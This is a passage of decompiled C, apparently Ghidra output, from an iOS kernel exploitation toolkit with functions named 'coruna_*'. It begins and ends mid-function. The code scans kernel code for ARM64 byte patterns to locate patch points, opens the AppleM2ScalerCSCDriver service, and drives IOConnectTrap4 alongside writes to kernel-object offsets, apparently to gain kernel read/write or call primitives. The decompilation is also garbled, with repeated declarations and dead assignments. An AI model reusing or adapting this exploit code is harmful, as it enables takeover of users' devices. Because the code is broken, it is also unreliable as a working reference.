  int scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint64_t host_info;
  int serial_buf;
  uint64_t action;
  uint64_t bootargs;
  uint64_t block_ctx;
  long stack_guard;
  
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  serial_buf = 0;
  bootargs = 0;
  u = *(uint *)(handle + 0x180);
  size = 0;
  if (u != 0) {
    size = 0x1000 / u;
  }
  err = 0x1000 - size * u;
  scratch = 0x1000;
  if (err != 0) {
    scratch = (u - err) + 0x1000;
  }
  if (*(long *)(handle + 0x200) == 0) {
    coruna_macho_text_sect(&action,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
    scratch = bootargs;
    thread_attr = action;
    host_info = block_ctx;
    addr = coruna_strsep(&action,"00 00 01 91 C0 03 5F D6",0,0);
    if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
    ___stack_chk_fail();
    }
    return;
  }
  version = _IOServiceMatching("AppleM2ScalerCSCDriver");
  version = _IOServiceGetMatchingService(*(uint32_t *)k_kernel_kiomasterportdefault_slot,version);
  u = (int)version + 1;
  if (((((1 < u) &&
        (err = _IOServiceOpen(version,*(uint32_t *)k_kernel_mach_task_self_slot,0,&serial_buf),
        err == 0)) && (1 < serial_buf + 1U)) &&
      ((addr = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(handle), addr != 0 &&
       (err = coruna_kernel509_residual_307(handle,addr,&bootargs), err != 0)))) &&
     ((off = coruna_fn_ptr_cast_2(handle,bootargs), off != 0 &&
      (off = coruna_mach_port_request_notification_29a50(handle,&scratch), off != 0)))) {
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,bootargs,0x1000,&action);
    if ((err != 0) && (err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,off,&action,0x1000), err != 0)) {
      handle = 0x5c0;
      if (*(int *)(handle + 0x140) < 0x1809) {
        handle = 0x5b8;
      }
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,handle + off,*(uint64_t *)(handle + 0x200));
      if (err != 0) {
        coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,addr,off);
        coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,addr + 0x40,8);
        coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,addr + 0x48,val);
        coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,addr + 0x50,addr_2 * 2 + -0x10);
        port = _IOConnectTrap4(serial_buf,0,id_2,size_3,off_4,0);
        coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,addr + 0x40,0);
        coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,addr + 0x48,0);
        coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,addr + 0x50,0);
        coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,addr,bootargs);
        if (arg != (unsigned long *)0x0) {
          *arg = port & 0xffffffff;
        }
      }
    }
    coruna_mach_port_allocate(handle,off,scratch);
  }
  if (1 < serial_buf + 1U) {
    _IOServiceClose();
  }
  if (1 < u) {
    _IOObjectRelease(version);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_strsep(uint64_t *val,char *path,uint32_t size,uint32_t flags_2)
{
  int err;
  char *ptr;
  char *buf;
  long handle;
  uint64_t u;
  long addr;
  long off;
  char *scratch;
  uint64_t scratch;
  uint64_t bootargs;
  char *thread_attr;
  ushort host_info [128];
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  thread_attr = (char *)0x0;
  if ((path == (char *)0x0) || (ptr = _strdup(path), ptr == (char *)0x0)) {
fail:
    u = 0;
  }
  else {
    addr = 0;
    off = 0;
    scratch = ptr;
    do {
      buf = _strsep(&scratch," ");
      err = _strcmp(buf,"-");
      handle = addr;
      if (err != 0) {
        err = _strcmp(buf,"+");
        if (err != 0) {
          err = _strcmp(buf,"..");
          if (err == 0) {
            host_info[addr] = 0xffff;
done:
            if (addr < 0x7f) {
              addr = addr + 1;
              handle = off;
              goto cleanup;
            }
          }
          else {
            handle = _strtol(buf,&thread_attr,0x10);
            host_info[addr] = (ushort)handle & 0xff;
            if (*thread_attr == '\0') {
              if (addr < 0x7f) {
                addr = addr + 1;
                handle = off;
                goto cleanup;
              }
            }
          }
          _free(ptr);
          goto fail;
        }
        handle = addr + 1;
      }
cleanup:
      off = handle;
    } while (scratch != (char *)0x0);
    _free(ptr);
    scratch = val[1];
    scratch = (char *)*val;
    bootargs = val[2];
    u = coruna_kernel509_via_cat(&scratch,host_info,addr,handle,size,flags_2);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
    ___stack_chk_fail(u);
  }
  return;
}
void coruna_kernel509_via_cat(long *handle,long addr_2,unsigned long arg,long off_3,int flags)
{
  unsigned long u;
  byte *ptr;
  int err;
  char err;
  ushort size;
  byte *buf;
  uint version;
  byte *str;
  byte err;
  long handle;
  char status;
  unsigned long port;
  byte *copy;
  short *lps14;
  byte *data;
  uint8_t port[16];
  long scratch;
  long bootargs;
  long thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t block_ctx;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t stack_guard;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t sa_saved;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t sa_new;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t path_buf;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  version = (uint)arg;
  err = (char)arg;
  if (((arg == (long)err) && (handle[2] != 0)) && (handle[1] != 0)) {
    port = arg;
    if (0 < (int)version) {
      u = ((unsigned long)-version | 0xffffffff00000000) + arg;
      handle = (arg & 0xffffffff) + 1;
      do {
        version = version - 1;
        port = arg;
        if (*(short *)(addr_2 + (unsigned long)version * 2) != -1) break;
        arg = arg - 1;
        handle = handle + -1;
        port = u;
      } while (1 < handle);
    }
    path_buf = coruna_cat(err,coruna_cat(err,coruna_cat(err,coruna_u64_pack14((err), (coruna_cat(err,coruna_cat(
                                                  err,coruna_cat(err,err))))))));
    cache_22 = coruna_cat(err,coruna_cat(err,coruna_cat(err,coruna_u64_pack14((err), (coruna_cat(err,coruna_cat(
                                                  err,coruna_cat(err,err))))))));
    cache_24 = cache_22;
    cache_23 = path_buf;
    cache = cache_22;
    sa_new = path_buf;
    cache_21 = cache_22;
    cache_20 = path_buf;
    json_buf = cache_22;
    sa_saved = path_buf;
    work = cache_22;
    frame = path_buf;
    region = cache_22;
    stack_guard = path_buf;
    url_buf = cache_22;
    plist = path_buf;
    sa_new = cache_22;
    block_ctx = path_buf;
    tmp_buf = cache_22;
    path_buf = path_buf;
    block_ctx = cache_22;
    action = path_buf;
    sa_saved = cache_22;
    stack_guard = path_buf;
    host_info = cache_22;
    serial_buf = path_buf;
    action = cache_22;
    serial_buf = path_buf;
    scratch = cache_22;
    host_info = path_buf;
    thread_attr = cache_22;
    bootargs = path_buf;
    if (1 < err) {
      err = 0;
      do {
        handle = (long)*(short *)(addr_2 + (long)(char)err * 2);
        status = ~err + err;
        if (handle == -1) {
          path_buf = coruna_cat(status,coruna_cat(status,coruna_cat(status,coruna_u64_pack14((status), (coruna_cat(status
                                                  ,coruna_cat(status,coruna_cat(status,status))))))));
          cache_22 = coruna_cat(status,coruna_cat(status,coruna_cat(status,coruna_u64_pack14((status), (coruna_cat(
                                                  status,coruna_cat(status,coruna_cat(status,status))))))
                                              ));
          cache_24 = cache_22;
          cache_23 = path_buf;
          cache = cache_22;
          sa_new = path_buf;
          cache_21 = cache_22;
          cache_20 = path_buf;
          json_buf = cache_22;
          sa_saved = path_buf;
          work = cache_22;
          frame = path_buf;
          region = cache_22;
          stack_guard = path_buf;
          url_buf = cache_22;
          plist = path_buf;
          sa_new = cache_22;
          block_ctx = path_buf;
          tmp_buf = cache_22;
          path_buf = path_buf;
          block_ctx = cache_22;
          action = path_buf;
          sa_saved = cache_22;
          stack_guard = path_buf;
          host_info = cache_22;
          serial_buf = path_buf;
          action = cache_22;
          serial_buf = path_buf;
          scratch = cache_22;
          host_info = path_buf;
          thread_attr = cache_22;
          bootargs = path_buf;
        }
        else {
          *(char *)((long)&host_info + handle) = status;
        }
        err = err + 1;
      } while ((int)(char)err < err + -1);
    }
    lps14 = (short *)(addr_2 + port * 2 + -2);
    handle = (long)*lps14;
    err = *(char *)((long)&host_info + handle);
    *(uint8_t *)((long)&host_info + handle) = 0;
    bootargs = handle[1];
    scratch = *handle;
    thread_attr = handle[2];
    port = coruna_kernel5_residual_226(&scratch,1);
    handle = port;
    buf = (byte *)0x0;
    if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
    ___stack_chk_fail(buf);
    }
    return;
  }
done:
  buf = (byte *)0x0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
    ___stack_chk_fail(buf);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_cat(uint64_t *val,char *path,uint64_t id_2,unsigned long arg)
{
  long handle;
  bool err;
  size_t ls3;
  uint16_t *ptr;
  unsigned long u;
  unsigned long size;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  ls3 = _strlen(path);
  ptr = _malloc((ls3 + 2) * 2);
  if (ptr != (uint16_t *)0x0) {
    ptr[ls3 + 1] = 0;
    *ptr = 0;
    if (ls3 != 0) {
      u = 0;
      size = 1;
      do {
        ptr[size] = (ushort)(byte)path[u];
        err = size < ls3;
        u = size;
        size = (unsigned long)((int)size + 1);
      } while (err);
    }
    err = (arg & 0x20) != 0;
    handle = ls3 + 1;
    if (err) {
      handle = ls3 + 2;
    }
    scratch = val[1];
    scratch = *val;
    bootargs = val[2];
    coruna_kernel509_via_cat(&scratch,ptr + (((uint)arg & 0x20) >> 5 ^ 1),handle,err,id_2,arg);
    _free(ptr);
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8(long *handle,uint64_t val,int flags)
{
  unsigned long u;
  int err;
  unsigned long size;
  void *ptr;
  unsigned long version;
  uint8_t size[16];
  long scratch;
  long bootargs;
  long thread_attr;
  uint64_t scratch;
  
  bootargs = handle[1];
  scratch = *handle;
  thread_attr = handle[2];
  scratch = val;
  size = coruna_kernel5_residual_226(&scratch,1);
  version = size;
  if ((version != 0) && (size != 0)) {
    u = version + size;
    size = (unsigned long)*(byte *)(*handle + 0x34);
    if (version + size <= u) {
      do {
        ptr = size;
        if ((flags == 0) || ((version & (long)(flags + -1)) == 0)) {
          coruna_call_mach_vm_machine_attribute_1d4f8(*handle,ptr,size,size);
          err = _memcmp(ptr,&scratch,size);
          if (err == 0) {
            return;
          }
        }
        version = version + 1;
        size = size + -1;
        size = (long)ptr + 1;
      } while ((long)ptr + 1 + size <= u);
    }
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2(uint64_t *val,uint *size,uint *flags_2,unsigned long arg)
{
  uint *ptr;
  uint *buf;
  long handle;
  uint *str;
  unsigned long u;
  uint8_t size[16];
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  scratch = val[1];
  scratch = *val;
  bootargs = val[2];
  size = coruna_kernel5_residual_226(&scratch,1);
  handle = size;
  buf = size;
  if ((buf != (uint *)0x0) && (handle != 0)) {
    ptr = (uint *)((long)buf + handle);
    coruna_call_mach_vm_machine_attribute_1d4f8(*val,buf,handle,handle);
    if (buf < ptr) {
      str = buf;
      do {
        if ((*flags_2 & *str) == *size) {
          if (ptr <= str + arg) {
            return;
          }
          if (1 < arg) {
            u = 1;
            do {
              if ((flags_2[u] & str[u]) != size[u]) goto fail;
              u = u + 1;
            } while (arg != u);
          }
          if ((long)str + (val[1] - (long)buf) != 0) {
            return;
          }
        }
fail:
        str = str + 1;
      } while (str < ptr);
    }
  }
  return;
}
void coruna_macho_cstring(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  long handle;
  uint8_t scratch[24];
  uint8_t bootargs[24];
  
  coruna_macho_map_segsect(bootargs,handle,"__TEXT","__cstring");
  handle = coruna_kernel509_via_kernel509_via_cat(bootargs,size_3,0,0x21);
  if (handle != 0) {
    coruna_macho_map_segsect(scratch,handle,val,id_2);
    coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8(scratch,handle,*(uint8_t *)(handle + 0x34),1);
  }
  return;
}
void coruna_kernel509_via_strsep(long handle)
{
  char *ptr;
  char *buf;
  int err;
  uint u;
  long handle;
  long addr;
  unsigned long size;
  uint8_t scratch[24];
  uint8_t bootargs[24];
  uint8_t thread_attr[24];
  
  err = coruna_fn_ptr_cast_10(*(uint64_t *)(handle + 0x118),8);
  if (err == 0) {
    if ((*(unsigned long *)(handle + 0x88) < 0x22581401900000) ||
       (err = coruna_fn_ptr_cast_10(*(uint64_t *)(handle + 0x118),0x2000), err != 0)) {
      u = coruna_kernel5_residual_229(handle);
      coruna_macho_text_sect(scratch,handle);
      ptr = ".. 01 .. 8B 88 D0 38 D5 E8 00 00 B5";
      if (u != 1) {
        ptr = (char *)0x0;
      }
      buf = "6B FD 62 D3 7F 19 00 F1 .. .. .. 54";
      if (u < 2) {
        buf = ptr;
      }
      ptr = ".. FD .. D3 .. .. 00 F1 .. .. .. 54";
      if (u < 5) {
        ptr = buf;
      }
      addr = coruna_strsep(scratch,ptr,0,1);
      handle = 0xc;
      if (u < 2) {
        handle = -8;
      }
      if (addr == 0) {
        return;
      }
      size = addr + handle;
    }
    else {
      coruna_macho_text_sect(bootargs,handle);
      handle = coruna_strsep(bootargs,".. FD .. D3 .. 00 00 B5",0,1);
      if (handle == 0) {
        return;
      }
      size = handle + 8;
    }
  }
  else {
    coruna_macho_text_sect(thread_attr,handle);
    handle = coruna_strsep(thread_attr,"08 FD 64 D3 1F 21 00 F1 .. 00 00 54",0,1);
    if (handle == 0) {
      return;
    }
    size = handle + 0xc;
  }
  coruna_kernel509_via_kernel509_via_kernel5_residual_226_3(handle,size & 0xfffffffffffffffc,1);
  return;
}
void coruna_kernel5_residual_229(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x70);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
      return;
    }
    if (err == 0x1809) {
      return;
    }
    if (err == 0x1c1b) {
      return;
    }
  }
  else {
    if (err == 0x2258 || err == 0x225c) {
      return;
    }
    if (err == 0x2712) {
      return;
    }
  }
  return;
}
void coruna_ret_stub(uint64_t val,unsigned long arg)
{
  coruna_kernel509_via_kernel509_via_kernel5_residual_226_3(val,arg & 0xfffffffffffffffc,1);
  return;
}
void coruna_find_mod_init(uint64_t val)
{
  char *ptr;
  char *buf;
  uint u;
  unsigned long size;
  long handle;
  uint64_t scratch;
  unsigned long scratch;
  long bootargs;
  uint8_t thread_attr[8];
  long host_info;
  long serial_buf;
  uint64_t action;
  unsigned long bootargs;
  long block_ctx;
  
  u = coruna_kernel5_residual_229();
  coruna_macho_text_sect(&action,val);
  coruna_macho_map_segsect(thread_attr,val,"__DATA_CONST","__mod_init_func");
  if ((((host_info != 0 && serial_buf != 0) && (size = coruna_helper_127b4_1b298_stub(val), size != 0)) &&
      (bootargs < size)) && (size < block_ctx + bootargs)) {
    block_ctx = (bootargs - size) + block_ctx;
    bootargs = size;
  }
  ptr = "68 72 40 B9 08 01 19 32 68 72 00 B9";
  if (u != 1) {
    ptr = (char *)0x0;
  }
  buf = "68 82 40 B9 08 01 19 32 68 82 00 B9";
  if (u < 2) {
    buf = ptr;
  }
  scratch = bootargs;
  scratch = action;
  bootargs = block_ctx;
  handle = coruna_strsep(&scratch,buf,0,1);
  if ((handle != 0) &&
     (handle = coruna_kernel509_via_kernel509_via_kernel5_residual_226_3(val,handle + 0xcU & 0xfffffffffffffffc,1), handle != 0)) {
    coruna_helper_127b4_1b298_stub(val,handle);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_kernel5_residual_226(uint64_t val)
{
  uint u;
  long handle;
  unsigned long size;
  unsigned long version;
  uint8_t scratch[24];
  
  coruna_macho_text_sect(scratch);
  handle = coruna_strsep(scratch,"E0 03 15 AA .. .. .. .. FE 03 13 AA",0,1);
  if ((handle != 0) && (handle = coruna_kernel509_via_kernel509_via_kernel5_residual_226_2(val,handle + 4), handle != 0)) {
    version = 0xfffffffffffffffc;
    do {
      u = coruna_kernel509_via_kernel5_residual_226(val,handle + version + 4);
      if (((u & 0x9f000000) == 0x90000000) &&
         (size = coruna_kernel509_via_kernel5_residual_226(val,handle + version + 0xc),
         ((uint)(size >> 0x15) & 0x7ff) == 0x458)) {
        coruna_kernel509_via_kernel509_via_kernel5_residual_226_3(val,handle + version + 4,1);
        return;
      }
      version = version + 4;
    } while (version < 0xfc);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_kernel5_residual_226_2(void)
{
  coruna_kernel509_via_kernel5_residual_226();
  return;
}
void coruna_ret_stub_2(uint64_t val,uint64_t id_2)
{
  coruna_kernel509_via_kernel509_via_kernel5_residual_226_3(val,id_2,1);
  return;
}
void coruna_kernel509_via_helper_127b4_1b298_stub(long handle,uint32_t *size)
{
  int err;
  long handle;
  uint64_t u;
  long addr;
  long off;
  uint64_t scratch;
  long bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  long serial_buf;
  long action;
  
  off = *(long *)(handle + 0x118);
  err = coruna_fn_ptr_cast_10(off,0x20);
  if (err == 0) {
    off = coruna_kernel509_via_kernel509_via_kernel5_residual_226(handle);
    if (off == 0) {
      return;
    }
    scratch = 8;
  }
  else {
    coruna_macho_text_sect(&host_info,*(uint64_t *)(&k_kernel_slot_19f8 + off));
    bootargs = serial_buf + action + -0x20000;
    action = 0x20000;
    scratch = host_info;
    thread_attr = 0x20000;
    serial_buf = bootargs;
    handle = coruna_strsep(&scratch,"2B 09 40 B9 4B 39 0B 8B",0,1);
    if (handle == 0) {
      return;
    }
    handle = coruna_kernel509_via_kernel509_via_kernel5_residual_226_3(handle,handle + -0x28,1);
    if (handle == 0) {
      return;
    }
    u = coruna_helper_127b4_1b298_stub(handle,handle + -8);
    addr = coruna_fn_ptr_cast_2(off,u);
    if (addr == 0) {
      return;
    }
    err = coruna_kernel509_via_mach_vm_read_overwrite(off,u,&scratch);
    if (err == 0) {
      return;
    }
    if (0x1f < (int)scratch - 1U) {
      return;
    }
    u = coruna_helper_127b4_1b298_stub(handle,handle);
    off = coruna_fn_ptr_cast_2(off,u);
    if (off == 0) {
      return;
    }
  }
  *size = (int)scratch;
  return;
}
void coruna_kernel509_str_5f_00_00_71_20_01_00_54(long handle,uint64_t val,uint64_t id_2)
{
  char *ptr;
  int err;
  long handle;
  long addr;
  uint8_t scratch[24];
  
  err = coruna_kernel5_residual_229();
  coruna_macho_text_sect(scratch,handle);
  ptr = (char *)0x0;
  if (err != 0) {
    ptr = "5F 00 00 71 20 01 00 54";
  }
  handle = coruna_strsep(scratch,ptr,0,0);
  if ((((handle != 0) && (addr = coruna_kernel509_via_kernel509_via_kernel5_residual_226_3(handle,handle + 8,1), addr != 0)) &&
      (handle = coruna_kernel509_via_kernel509_via_kernel5_residual_226_3(handle,handle + 0x18,1), handle != 0)) &&
     (err = coruna_kernel509_residual_307(*(uint64_t *)(handle + 0x118),handle,val), err != 0)) {
    coruna_kernel509_residual_307(*(uint64_t *)(handle + 0x118),addr,id_2);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_kernel509_via_kernel5_residual_226_2(long handle,int flags)
{
  long handle;
  char *ptr;
  char *buf;
  uint u;
  long addr;
  uint64_t size;
  uint8_t scratch[24];
  
  if (((flags < 1) && (handle = handle + (long)flags * 8, *(long *)(&k_kernel_slot_1960 + handle) == 0)
      ) && (flags == 0)) {
    size = *(uint64_t *)(&k_kernel_slot_19f8 + handle);
    u = coruna_kernel5_residual_229(size);
    coruna_macho_text_sect(scratch,size);
    ptr = "09 .. 00 F9 E1 03 00 32 00 00 80 52";
    if (u != 1) {
      ptr = (char *)0x0;
    }
    buf = "09 .. 00 F9 00 00 80 52 E1 03 00 32";
    if (u < 2) {
      buf = ptr;
    }
    addr = coruna_strsep(scratch,buf,0,0);
    if ((addr != 0) && (addr = coruna_kernel509_via_kernel509_via_kernel5_residual_226_2(size,addr + 0xc), addr != 0)) {
      *(long *)(&k_kernel_slot_1960 + handle) = addr;
    }
  }
  return;
}
void coruna_kernel509_via_kernel509_via_kernel5_residual_226_3(uint64_t val,unsigned long arg,int flags)
{
  unsigned long u;
  uint size;
  int err;
  uint version;
  bool err;
  
  if ((arg & 3) == 0) {
    size = coruna_kernel509_via_kernel5_residual_226();
    if (size == 0xd503201f) {
      coruna_kernel509_via_kernel5_residual_226(val,arg + 4);
    }
    else if (((size & 0x9f000000) == 0x90000000) ||
            (((size & 0x9f000000) == 0x10000000 &&
             (err = coruna_kernel509_via_kernel5_residual_226(val,arg + 4), err == -0x2afcdfe1)))) {
      err = false;
      size = size & 0x1f;
      u = arg + 0x20;
      while( true ) {
        arg = arg + 4;
        version = coruna_kernel509_via_kernel5_residual_226(val,arg);
        if (((version & 0x7f000000) == 0x11000000) && (!err)) {
          if ((version >> 5 & 0x1f) == size) {
            if (flags == 0) {
              return;
            }
            if (size != (version & 0x1f)) {
              return;
            }
            err = true;
          }
          else {
            err = false;
          }
        }
        if (((version & 0xbfc00000) == 0xb9400000) && ((version >> 5 & 0x1f) == size)) {
          return;
        }
        if ((((version & 0xffc00000) == 0xb9800000) || ((version & 0xffc00000) == 0x39400000)) &&
           ((version >> 5 & 0x1f) == size)) break;
        if (version == 0xd65f03c0) {
          return;
        }
        if (u < arg) {
          return;
        }
      }
      return;
    }
  }
  return;
}
void coruna_host_kernel_version(char *path,unsigned long arg)
{
  mach_port_t host;
  uint u;
  int err;
  int *err;
  uint *ptr;
  size_t ls5;
  uint64_t scratch;
  size_t bootargs;
  char scratch [512];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  if (800.0 <= *(double *)k_kernel_dyldversionnumber_slot) {
    scratch = k_kernel_rodata_word_434e0;
    bootargs = 0x200;
    err = _sysctl((int *)&scratch,2,scratch,&bootargs,(void *)0x0,0);
    if (err != 0) {
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
        u = *ptr;
      }
      u = u | 0x40000000;
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
  }
  else {
    host = _mach_host_self();
    u = _host_kernel_version(host,scratch);
    if (u != 0) {
      u = u | 0x80000000;
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
  }
  ls5 = _strlen(scratch);
  if (arg < ls5 + 1) {
    u = 0xad00c;
  }
  else {
    _strlcpy(path,scratch,arg);
    u = 0;
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}
void coruna_parse_xnu_five(uint64_t *val,uint32_t *size,uint32_t *flags_2)
{
  int err;
  char *ptr;
  size_t ls3;
  int *err;
  uint64_t u;
  char *buf;
  uint64_t scratch;
  char scratch [512];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  if (k_kernel_rodata_word_434e8 <= *(double *)k_kernel_dyldversionnumber_slot) {
    ___strlcpy_chk(scratch,k_kernel_kernelversionstring_slot,0x200,0x200);
    ls3 = _strlen(scratch);
    u = 0;
    if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
    }
    ___stack_chk_fail(u);
  }
  else {
    err = coruna_host_kernel_version(scratch,0x200);
    if (err == 0) {
      ptr = _strstr(scratch,"RELEASE");
      u = 0;
      if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
      return;
      }
      ___stack_chk_fail(u);
    }
  }
  u = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(u);
}
void coruna_mach_vm_page_info(vm_map_t arg,mach_vm_address_t arg_x,uint64_t *val)
{
  kern_return_t lk1;
  mach_msg_type_number_t scratch;
  int bootargs [4];
  uint64_t thread_attr;
  
  scratch = 8;
  lk1 = _mach_vm_page_info(arg,arg_x,1,bootargs,&scratch);
  if ((lk1 == 0) && (val != (uint64_t *)0x0)) {
    *val = thread_attr;
  }
  return;
}
void coruna_call_mach_vm_machine_attribute_1d4f8_20f14(void)
{
  coruna_ret_stub_9();
  return;
}
void coruna_call_return_zero_61a8_20f50(void)
{
  coruna_helper_12310_418c8();
  return;
}
void coruna_host_page_size(void)
{
  mach_port_t lm1;
  vm_size_t scratch;
  
  lm1 = _mach_host_self();
  _host_page_size(lm1,&scratch);
  return;
}
void coruna_kernel509_residual_299(void)
{
  uint64_t u;
  
  if (k_kernel_rodata_word_434f0 <= *(double *)k_kernel_dyldversionnumber_slot) {
    u = tpidr_el0;
  }
  else {
    u = tpidrro_el0;
  }
  return;
}
void coruna_task_info_1669c(task_name_t arg,uint64_t *val,uint64_t *id_2)
{
  kern_return_t lk1;
  mach_msg_type_number_t scratch;
  integer_t bootargs [38];
  uint64_t thread_attr;
  uint64_t scratch;
  
  scratch = 0x2a;
  lk1 = _task_info(arg,0x16,bootargs,&scratch);
  if ((lk1 == 0) && (scratch == 0x2a)) {
    *val = thread_attr;
    *id_2 = scratch;
  }
  return;
}
void coruna_kernel509_via_helper_12310_418c8(uint32_t *size)
{
  long handle;
  
  handle = coruna_helper_12310_418c8();
  if (handle != 0) {
    *size = *(uint32_t *)(handle + 0x80);
  }
  return;
}
void coruna_kernel5_residual_231(uint size,uint64_t *val)
{
  uint64_t *ptr;
  uint32_t *buf;
  
  if ((3 < size) && (ptr = _calloc(0x10,1), ptr != (uint64_t *)0x0)) {
    buf = _calloc((unsigned long)size,1);
    *ptr = buf;
    if (buf == (uint32_t *)0x0) {
      _free(ptr);
    }
    else {
      *buf = 0xd3;
      *(uint32_t *)(ptr + 1) = 4;
      *(uint *)((long)ptr + 0xc) = size;
      *val = ptr;
    }
  }
  return;
}
void coruna_kernel5_residual_232(long *handle,uint size,uint flags_2,uint64_t *val)
{
  uint u;
  long handle;
  uint size;
  
  if ((flags_2 & 0xff000000) == 0) {
    u = (size & 0x7f000000) - 0x1000000 >> 0x18;
    if (u < 0xc) {
      size = 1 << (unsigned long)(u & 0x1f);
      if ((size & 0xc07) == 0) {
        if ((size & 0x380) == 0) {
          if (u != 3) {
            return;
          }
          u = 0xc;
        }
        else {
          u = flags_2 + 7 & 0xfffffffc;
        }
      }
      else {
        u = 4;
      }
      if (u <= *(int *)((long)handle + 0xc) - *(uint *)(handle + 1)) {
        handle = *handle;
        *(uint *)(handle + (unsigned long)*(uint *)(handle + 1)) = flags_2 | size;
        u = (int)handle[1] + 4;
        *(uint *)(handle + 1) = u;
        size = (size & 0x7f000000) + 0xfc000000 >> 0x18;
        if (size - 4 < 3) {
          size = flags_2 + 3 & 0xfffffffc;
          _memcpy((void *)(handle + (unsigned long)u),val,(unsigned long)flags_2);
        }
        else {
          if (size != 0) {
            return;
          }
          *(uint64_t *)(handle + (unsigned long)u) = *val;
          size = 8;
        }
        *(uint *)(handle + 1) = (int)handle[1] + size;
      }
    }
  }
  return;
}
void coruna_kernel5_residual_233(long *handle,uint64_t *val,uint32_t *size)
{
  uint u;
  void *ptr;
  
  if (((*handle != 0) && (u = *(uint *)(handle + 1), u != 0)) &&
     (*(int *)((long)handle + 0xc) != 0)) {
    ptr = _malloc((unsigned long)u);
    *val = ptr;
    if (ptr != (void *)0x0) {
      _memcpy(ptr,(void *)*handle,(unsigned long)u);
      *size = (int)handle[1];
    }
  }
  return;
}
void coruna_kernel5_residual_234(uint64_t *val)
{
  if ((void *)*val != (void *)0x0) {
    _free((void *)*val);
  }
  *val = 0;
  val[1] = 0;
  _free(val);
  return;
}
void coruna_kernel5_residual_235(int flags)
{
  int err;
  
  err = _pipe(flags);
  if (err != 0) {
    ___error();
    ___error();
  }
  return;
}
void coruna_kernel5_residual_236(int *flags)
{
  int err;
  uint u;
  ssize_t ls3;
  int *err;
  uint *ptr;
  uint8_t scratch[256];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  do {
    ls3 = _read(*flags,scratch,0x100);
  } while (0 < ls3);
  err = ___error();
  if (*err == 0x23) {
    u = 0;
  }
  else {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != bootargs) {
    ___stack_chk_fail(u);
  }
  return;
}
void coruna_kernel5_via_fcntl(uint32_t *size)
{
  int err;
  
  err = coruna_fcntl(*size);
  if (err == 0) {
    coruna_fcntl(size[1]);
  }
  return;
}
void coruna_fcntl(int flags)
{
  int err;
  
  if ((flags != -1) &&
     ((((err = _fcntl(flags,0x49), err == -1 || (err = _fcntl(flags,1), err == -1)) ||
       (err = _fcntl(flags,2), err == -1)) ||
      ((err = _fcntl(flags,3), err == -1 || (err = _fcntl(flags,4), err == -1)))))) {
    ___error();
    ___error();
  }
  return;
}
void coruna_kernel5_residual_237(long handle,void *ctx,size_t len)
{
  ssize_t ls1;
  
